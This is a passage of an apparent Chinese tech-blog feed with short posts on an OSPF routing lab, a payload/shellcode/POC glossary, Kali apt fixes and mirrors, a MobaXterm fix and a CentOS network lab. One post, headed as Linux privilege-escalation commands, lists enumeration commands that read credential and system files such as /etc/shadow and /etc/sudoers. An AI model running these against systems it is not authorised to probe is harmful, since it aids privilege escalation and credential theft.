src="https://img-blog.csdnimg.cn/20191006185623206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="在ISP1、ISP2、ISP3上配置ospf动态路由"><a href="#在ISP1、ISP2、ISP3上配置ospf动态路由" class="headerlink" title="在ISP1、ISP2、ISP3上配置ospf动态路由"></a>在ISP1、ISP2、ISP3上配置ospf动态路由</h2><ol><li>在ISP1上启用ospf路由，宣告网络<br><img src="https://img-blog.csdnimg.cn/20191006185749608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/201910061858454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>在ISP2上启用ospf路由，宣告网络<br><img src="https://img-blog.csdnimg.cn/20191006190130949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ol><p><img src="https://img-blog.csdnimg.cn/20191006190205761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="3"><li><p>在ISP3上启用ospf路由，宣告网络<img src="https://img-blog.csdnimg.cn/20191006185927707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191006185936819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>在ISP1上使用<code>show ip route</code> 查看路由表<br><img src="https://img-blog.csdnimg.cn/20191006190236476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li>使用ping命令检查PC1到inter-Srv的连通性<br><img src="https://img-blog.csdnimg.cn/20191006191029621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ol><h3 id="在FireWall上配置静态默认路由"><a href="#在FireWall上配置静态默认路由" class="headerlink" title="在FireWall上配置静态默认路由"></a>在FireWall上配置静态默认路由</h3><ol><li>在FireWall上查看路由表，<br><img src="https://img-blog.csdnimg.cn/2019100619105616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>在FireWall上配置默认路由指向ISP1<br><img src="https://img-blog.csdnimg.cn/20191006191208613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>ping命令检查PC0到PC1和inter-Srv的连通性<blockquote><p>说明: 这里肯定是不通的 因为作业要求使用不给Firewall配置ospf路由<br>想要PC0到PC1和inter-Srv互通需要设置Firewall到ISP1网段掩码由30改为8,再给Firewall配上ospf路由即可通讯</p></blockquote></li></ol><h4 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h4><p><img src="https://img-blog.csdnimg.cn/20191006191539673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191006191620318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>Server1到firewall不通</p><p>我尝试从pc1与ISP3进行连接发现也是不通,我认为应该是ISP3路由没有与172.16.1.0网段建立连接</p><p>解决:因此我尝试在ISP1上添加了静态默认路由<br><img src="https://img-blog.csdnimg.cn/20191006191639676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并且也在ISP2与ISP3中建立了与172.16.1.0网段的连接</p><p>尝试PC0与PC1,Server的连接</p><p><img src="https://img-blog.csdnimg.cn/20191006191656972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191006191706489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>成功!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;网络拓扑如下&quot;&gt;&lt;a href=&quot;#网络拓扑如下&quot; class=&quot;headerlink&quot; title=&quot;网络拓扑如下&quot;&gt;&lt;/a&gt;网络拓扑如下&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2019100618570037
      
    
    </summary>
    
      <category term="网络" scheme="https://plutoacharon.github.io/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="网络" scheme="https://plutoacharon.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>payload、shellcode、exp、poc区分方法</title>
    <link href="https://plutoacharon.github.io/2019/10/06/payload%E3%80%81shellcode%E3%80%81exp%E3%80%81poc%E5%8C%BA%E5%88%86%E6%96%B9%E6%B3%95/"/>
    <id>https://plutoacharon.github.io/2019/10/06/payload、shellcode、exp、poc区分方法/</id>
    <published>2019-10-06T13:02:58.000Z</published>
    <updated>2019-10-06T13:03:48.193Z</updated>
    
    <content type="html"><![CDATA[<p>在学习网络安全的过程中经常会听到几个名词,例如</p><p><code>payload、shellcode、exp、poc</code>等</p><p>碰见不懂的东西就要去搞懂,于是动手查了查资料</p><h2 id="Payload是什么？"><a href="#Payload是什么？" class="headerlink" title="Payload是什么？"></a>Payload是什么？</h2><p>是包含在你用于一次漏洞利用（<strong>exploit</strong>）中的<strong>ShellCode</strong>中的主要功能代码</p><p>对于一个漏洞，他可以被利用（<strong>exploit</strong>），利用有一个完整的解决方案你可以把这个看作是名词的（<strong>exploit</strong>），然后利用必然有目的，而你的目的就是通过<strong>Payload</strong>来实现的，比如开3389，创建用户，修改密码等等等。</p><p><strong>Payload</strong>是可以被模块化的，一个<strong>Payload</strong>可以稍作修改就用于各种漏洞，同时，对于一个漏洞，他的利用方式必然要涉及到<strong>ShellCode</strong>，因为<strong>Payload</strong>是包含在<strong>ShellCode</strong>中的，<strong>ShellCode</strong>是真正的被输入到存在漏洞的程序中的，并且<strong>ShellCode</strong>负责把程序的流程最终转移到你的<strong>Payload代码</strong>中。所以对于一个漏洞来说，<strong>ShellCode</strong>就是一个用于某个漏洞的二进制代码框架，有了这个框架你可以在这个<strong>ShellCode</strong>中包含你需要的<strong>Payload</strong>来做一些事情。</p><p>然后你整理这个过程，把<strong>Crash</strong>的原因和导致的结果分析写出文章，然后附上你上面写的<strong>ShellCode</strong>，这就是一个<strong>POC</strong>（Proof of Concept概念证明）。</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>payload:翻译过来是有效载荷</p><p>通常在传输数据时，为了使数据传输更可靠，要把原始数据分批传输，并且在每一批数据的头和尾都加上一定的辅助信息，比如数据量的大小、校验位等，这样就相当于给已经分批的原始数据加一些外套，这些外套起标示作用，使得原始数据不易丢失，一批数据加上“外套”就形成了传输通道的基本传输单元，叫做数据帧或数据包，而其中的原始数据就是payload</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在学习网络安全的过程中经常会听到几个名词,例如&lt;/p&gt;
&lt;p&gt;&lt;code&gt;payload、shellcode、exp、poc&lt;/code&gt;等&lt;/p&gt;
&lt;p&gt;碰见不懂的东西就要去搞懂,于是动手查了查资料&lt;/p&gt;
&lt;h2 id=&quot;Payload是什么？&quot;&gt;&lt;a href=&quot;#P
      
    
    </summary>
    
      <category term="CTF" scheme="https://plutoacharon.github.io/categories/CTF/"/>
    
    
      <category term="安全" scheme="https://plutoacharon.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Kali apt-get报E: 无法打开锁文件 /var/lib/dpkg/lock-frontend - open (2: 没有那个文件或目录)</title>
    <link href="https://plutoacharon.github.io/2019/10/06/Kali-apt-get%E6%8A%A5E-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E9%94%81%E6%96%87%E4%BB%B6-var-lib-dpkg-lock-frontend-open-2-%E6%B2%A1%E6%9C%89%E9%82%A3%E4%B8%AA%E6%96%87%E4%BB%B6%E6%88%96%E7%9B%AE%E5%BD%95/"/>
    <id>https://plutoacharon.github.io/2019/10/06/Kali-apt-get报E-无法打开锁文件-var-lib-dpkg-lock-frontend-open-2-没有那个文件或目录/</id>
    <published>2019-10-06T13:02:29.000Z</published>
    <updated>2019-10-06T13:25:54.088Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kali-apt-get报E-无法打开锁文件-var-lib-dpkg-lock-frontend-open-2-没有那个文件或目录"><a href="#Kali-apt-get报E-无法打开锁文件-var-lib-dpkg-lock-frontend-open-2-没有那个文件或目录" class="headerlink" title="Kali apt-get报E: 无法打开锁文件 /var/lib/dpkg/lock-frontend - open (2: 没有那个文件或目录)"></a>Kali apt-get报E: 无法打开锁文件 /var/lib/dpkg/lock-frontend - open (2: 没有那个文件或目录)</h2><p>由于使用apt安装时一直报错,所以把文件夹直接删除</p><p>删除一时爽,删完毁断肠</p><p>解决办法：</p><pre><code>sudo mkdir -p /var/lib/dpkg/{alternatives,info,parts,triggers,updates}sudo cp /var/backups/dpkg.status.0 /var/lib/dpkg/statusapt-get download dpkgsudo dpkg -i dpkg*.debapt-get download base-filessudo dpkg -i base-files*.debsudo apt-get updatesudo apt-get check</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Kali-apt-get报E-无法打开锁文件-var-lib-dpkg-lock-frontend-open-2-没有那个文件或目录&quot;&gt;&lt;a href=&quot;#Kali-apt-get报E-无法打开锁文件-var-lib-dpkg-lock-frontend-open
      
    
    </summary>
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/categories/Liunx/"/>
    
    
      <category term="Kali" scheme="https://plutoacharon.github.io/tags/Kali/"/>
    
  </entry>
  
  <entry>
    <title>Kali apt报错E: 无法获得锁 /var/cache/apt/archives/lock - open (11: 资源暂时不可用)</title>
    <link href="https://plutoacharon.github.io/2019/10/06/Kali-apt%E6%8A%A5%E9%94%99E-%E6%97%A0%E6%B3%95%E8%8E%B7%E5%BE%97%E9%94%81-var-cache-apt-archives-lock-open-11-%E8%B5%84%E6%BA%90%E6%9A%82%E6%97%B6%E4%B8%8D%E5%8F%AF%E7%94%A8/"/>
    <id>https://plutoacharon.github.io/2019/10/06/Kali-apt报错E-无法获得锁-var-cache-apt-archives-lock-open-11-资源暂时不可用/</id>
    <published>2019-10-06T13:01:48.000Z</published>
    <updated>2019-10-06T13:02:13.214Z</updated>
    
    <content type="html"><![CDATA[<p>kali apt时报错:</p><pre><code>root@kali:~# apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y E: 无法获得锁 /var/cache/apt/archives/lock - open (11: 资源暂时不可用)E: 无法对目录 /var/cache/apt/archives/ 加锁</code></pre><p>解决:</p><p>将/var/cache/apt/archives/lock删除</p><p><code>rm -rf /var/cache/apt/archives/lock</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;kali apt时报错:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@kali:~# apt-get clean &amp;amp;&amp;amp; apt-get update &amp;amp;&amp;amp; apt-get upgrade -y &amp;amp;&amp;amp; apt-get dist-up
      
    
    </summary>
    
      <category term="CTF" scheme="https://plutoacharon.github.io/categories/CTF/"/>
    
    
      <category term="Kali" scheme="https://plutoacharon.github.io/tags/Kali/"/>
    
  </entry>
  
  <entry>
    <title>kali20119最新更新源</title>
    <link href="https://plutoacharon.github.io/2019/10/06/kali20119%E6%9C%80%E6%96%B0%E6%9B%B4%E6%96%B0%E6%BA%90/"/>
    <id>https://plutoacharon.github.io/2019/10/06/kali20119最新更新源/</id>
    <published>2019-10-06T13:00:55.000Z</published>
    <updated>2019-10-06T13:01:32.403Z</updated>
    
    <content type="html"><![CDATA[<h2 id="查看添加更新源"><a href="#查看添加更新源" class="headerlink" title="查看添加更新源"></a>查看添加更新源</h2><h3 id="编辑sources-list-将kali更新源加入其中"><a href="#编辑sources-list-将kali更新源加入其中" class="headerlink" title="编辑sources.list,将kali更新源加入其中"></a>编辑sources.list,将kali更新源加入其中</h3><p><code>sudo vim /etc/apt/sources.list</code></p><pre><code>#中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#浙大deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb http://mirrors.163.com/debian/ jessie main non-free contribdeb http://mirrors.163.com/debian/ jessie-updates main non-free contribdeb http://mirrors.163.com/debian/ jessie-backports main non-free contribdeb-src http://mirrors.163.com/debian/ jessie main non-free contribdeb-src http://mirrors.163.com/debian/ jessie-updates main non-free contribdeb-src http://mirrors.163.com/debian/ jessie-backports main non-free contribdeb http://mirrors.163.com/debian-security/ jessie/updates main non-free contribdeb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib</code></pre><blockquote><p>注：由于kali官方源较慢非常卡，所以可以换成国内更新源，并且国内更新源也不宜添加过多！</p></blockquote><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p><code>apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;查看添加更新源&quot;&gt;&lt;a href=&quot;#查看添加更新源&quot; class=&quot;headerlink&quot; title=&quot;查看添加更新源&quot;&gt;&lt;/a&gt;查看添加更新源&lt;/h2&gt;&lt;h3 id=&quot;编辑sources-list-将kali更新源加入其中&quot;&gt;&lt;a href=&quot;#编辑sour
      
    
    </summary>
    
      <category term="CTF" scheme="https://plutoacharon.github.io/categories/CTF/"/>
    
    
      <category term="Kali" scheme="https://plutoacharon.github.io/tags/Kali/"/>
    
  </entry>
  
  <entry>
    <title>Liunx提权常用命令</title>
    <link href="https://plutoacharon.github.io/2019/10/06/Liunx%E6%8F%90%E6%9D%83%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>https://plutoacharon.github.io/2019/10/06/Liunx提权常用命令/</id>
    <published>2019-10-06T13:00:13.000Z</published>
    <updated>2019-10-06T13:00:30.902Z</updated>
    
    <content type="html"><![CDATA[<h2 id="操作系统信息收集"><a href="#操作系统信息收集" class="headerlink" title="操作系统信息收集"></a>操作系统信息收集</h2><h3 id="如何查看服务器的版本"><a href="#如何查看服务器的版本" class="headerlink" title="如何查看服务器的版本"></a>如何查看服务器的版本</h3><pre><code>cat /etc/issuecat /etc/*-releasecat /etc/lsb-release # 基于 Debiancat /etc/redhat-release # 基于 Redhat</code></pre><h3 id="如何查看内核的版本信息？"><a href="#如何查看内核的版本信息？" class="headerlink" title="如何查看内核的版本信息？"></a>如何查看内核的版本信息？</h3><pre><code>cat /proc/versionuname -auname -mrsrpm -q kerneldmesg | grep Linuxls /boot | grep vmlinuz-</code></pre><h2 id="应用和服务信息"><a href="#应用和服务信息" class="headerlink" title="应用和服务信息"></a>应用和服务信息</h2><h3 id="有什么服务在运行？是以什么样的权限在运行？"><a href="#有什么服务在运行？是以什么样的权限在运行？" class="headerlink" title="有什么服务在运行？是以什么样的权限在运行？"></a>有什么服务在运行？是以什么样的权限在运行？</h3><pre><code>ps auxps -eftopcat /etc/services</code></pre><h2 id="有什么工作任务计划？"><a href="#有什么工作任务计划？" class="headerlink" title="有什么工作任务计划？"></a>有什么工作任务计划？</h2><pre><code>crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root</code></pre><h2 id="跟用户相关的信息"><a href="#跟用户相关的信息" class="headerlink" title="跟用户相关的信息"></a>跟用户相关的信息</h2><h3 id="我是谁？谁登入了？谁登入过？等"><a href="#我是谁？谁登入了？谁登入过？等" class="headerlink" title="我是谁？谁登入了？谁登入过？等"></a>我是谁？谁登入了？谁登入过？等</h3><pre><code>idwhowlastcat /etc/passwd | cut -d: -f1 # 列出用户grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 { print $1}&apos; # 列出超级用户awk -F: &apos;($3 == &quot;0&quot;) {print}&apos; /etc/passwd # 列出超级用户cat /etc/sudoerssudo -l</code></pre><p>有哪些敏感文件？</p><pre><code>cat /etc/passwdcat /etc/groupcat /etc/shadowls -alh /var/mail/</code></pre><p>转自: </p><p>cnblogs.com/-qing-/p/10610827.html</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;操作系统信息收集&quot;&gt;&lt;a href=&quot;#操作系统信息收集&quot; class=&quot;headerlink&quot; title=&quot;操作系统信息收集&quot;&gt;&lt;/a&gt;操作系统信息收集&lt;/h2&gt;&lt;h3 id=&quot;如何查看服务器的版本&quot;&gt;&lt;a href=&quot;#如何查看服务器的版本&quot; class=&quot;
      
    
    </summary>
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/categories/Liunx/"/>
    
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/tags/Liunx/"/>
    
  </entry>
  
  <entry>
    <title>MobaXterm汉化以及解决中文乱码问题</title>
    <link href="https://plutoacharon.github.io/2019/10/06/MobaXterm%E6%B1%89%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/"/>
    <id>https://plutoacharon.github.io/2019/10/06/MobaXterm汉化以及解决中文乱码问题/</id>
    <published>2019-10-06T12:59:30.000Z</published>
    <updated>2019-10-06T12:59:52.851Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://img-blog.csdnimg.cn/2019100419570919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在使用MobaXterm过程中会遇到中文乱码的问题,这时候我们需要设置一下编码<br>点击鼠标右键<br><img src="https://img-blog.csdnimg.cn/20191004195814767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选择第二个ISO选项<br><img src="https://img-blog.csdnimg.cn/2019100419584583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>再次输入出现乱码的命令<br><img src="https://img-blog.csdnimg.cn/20191004195923291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改成功!</p><hr><p>如果设置完以后使用其他命令出现乱码,则修改回UTF-8编码即可</p><h2 id="汉化包下载"><a href="#汉化包下载" class="headerlink" title="汉化包下载:"></a>汉化包下载:</h2><p>链接: <a href="https://pan.baidu.com/s/1UAxKfsSj9OOpC3ojaLN5IQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1UAxKfsSj9OOpC3ojaLN5IQ</a> 提取码: myi3</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2019100419570919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6
      
    
    </summary>
    
      <category term="其他" scheme="https://plutoacharon.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
  <entry>
    <title>centos7 使用vi编辑器配置网络环境</title>
    <link href="https://plutoacharon.github.io/2019/10/03/centos7-%E4%BD%BF%E7%94%A8vi%E7%BC%96%E8%BE%91%E5%99%A8%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83/"/>
    <id>https://plutoacharon.github.io/2019/10/03/centos7-使用vi编辑器配置网络环境/</id>
    <published>2019-10-03T13:50:11.000Z</published>
    <updated>2019-10-03T13:53:57.241Z</updated>
    
    <content type="html"><![CDATA[<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><table><thead><tr><th>命令和路径</th><th>描述</th></tr></thead><tbody><tr><td>ifconfig</td><td>改变网卡地址，启用禁用网卡</td></tr><tr><td>route</td><td>管理本机路由表</td></tr><tr><td>hostname</td><td>设置本机主机名</td></tr></tbody></table><h2 id="一-使用ifconfig命令改变网卡IP地址"><a href="#一-使用ifconfig命令改变网卡IP地址" class="headerlink" title="一 使用ifconfig命令改变网卡IP地址"></a>一 使用ifconfig命令改变网卡IP地址</h2><ol><li>使用ifconfig命令查看虚拟机的IP地址<br><img src="https://img-blog.csdnimg.cn/20191003182737246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li><p>使用ifconfig命令把虚拟机的地址设成192.168.238.7</p><blockquote><p>注意:这里我修改了静态,所以使用该命令的时候需要是DHCP才可以更改成功</p></blockquote></li></ol><p><img src="https://img-blog.csdnimg.cn/20191003182741787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="3"><li>使用ping命令检查虚拟机到主机的互通性<br><img src="https://img-blog.csdnimg.cn/2019100318274835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>使用route命令查看本机的路由表</li></ol><p><img src="https://img-blog.csdnimg.cn/20191003182955697.png" alt="在这里插入图片描述"></p><h2 id="二-熟悉vi的基本命令"><a href="#二-熟悉vi的基本命令" class="headerlink" title="二 熟悉vi的基本命令"></a>二 熟悉vi的基本命令</h2><h3 id="编辑作业2任务二的命令行到一个文件中"><a href="#编辑作业2任务二的命令行到一个文件中" class="headerlink" title="编辑作业2任务二的命令行到一个文件中"></a>编辑作业2任务二的命令行到一个文件中</h3><pre><code>1.    vi的三种模式的特点、如何切换i                进入插入模式esc                进入命令模式：              进入末行模式2.    vi  &lt;文件名&gt;        打开文件:q                结束编辑:q!                不存盘退出:w                存盘后退出:wq                强制存盘后退出3.    vi基本编辑（命令模式下）dd                删除光标所在行yy                复制光标所在行nyy                复制光标所在n行p                粘贴</code></pre><p> <img src="https://img-blog.csdnimg.cn/20191003183021603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="三-编辑网卡配置文件配置IP地址和网关以及DNS"><a href="#三-编辑网卡配置文件配置IP地址和网关以及DNS" class="headerlink" title="三 编辑网卡配置文件配置IP地址和网关以及DNS"></a>三 编辑网卡配置文件配置IP地址和网关以及DNS</h2><p>配置文件|    描述<br>|–|–|<br>/ect/sysconfig/network-scripts/ifcfg-ens*|    第一块以太网卡的配置文件<br>/etc/resolv.conf|    域名服务器配置文件</p><ol><li>打开vmware虚拟网络编辑器，查看vmnet8的地址和网关<br><img src="https://img-blog.csdnimg.cn/2019100318313638.png" alt="在这里插入图片描述"></li><li>使用vi编辑/etc/sysconfig/network-scripts/ifcfg-ens，把地址设置为vmnet8的同一网段，网关地址相同，编辑好的ifcfg-ens*文件<br><img src="https://img-blog.csdnimg.cn/20191003183139842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>使用systemctl  restart  network  重启网络服务<br><img src="https://img-blog.csdnimg.cn/20191003183143937.png" alt="在这里插入图片描述"></li><li>使用ifconfig检查IP地址配置，ping <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a><br><img src="https://img-blog.csdnimg.cn/20191003183159206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>使用vi编辑/etc/resolv.conf，ping <a href="http://www.baidu.com，" target="_blank" rel="noopener">www.baidu.com，</a><br><img src="https://img-blog.csdnimg.cn/20191003183203873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191003183212607.png" alt="在这里插入图片描述"><h2 id="四-使用SSH远程管理linux服务器"><a href="#四-使用SSH远程管理linux服务器" class="headerlink" title="四 使用SSH远程管理linux服务器"></a>四 使用SSH远程管理linux服务器</h2></li><li>使用netstat -antp 查看虚拟机开放端口，标出sshd<br><img src="https://img-blog.csdnimg.cn/20191003183836361.png" alt="在这里插入图片描述"></li><li>使用systemctl  stop  sshd 停止服务，再查看虚拟机开放端口<br><img src="https://img-blog.csdnimg.cn/20191003183840555.png" alt="在这里插入图片描述"></li><li><p>查看sshd的配置文件，/etc/ssh/ sshd_config; /etc/ssh/ ssh_config<br><code>grep  -v  ^#  /etc/ssh/sshd_config | grep  -v  ^$</code><br><img src="https://img-blog.csdnimg.cn/20191003183845300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>查看sshd的密钥文件，/etc/ssh/ ssh_host_rsa_key; /etc/ssh/ ssh_host_rsa_key.pub<br><img src="https://img-blog.csdnimg.cn/20191003183849314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191003183855234.png" alt="在这里插入图片描述"></p></li><li>使用systemctl  start  sshd启动服务，再查看虚拟机开放端口<br><img 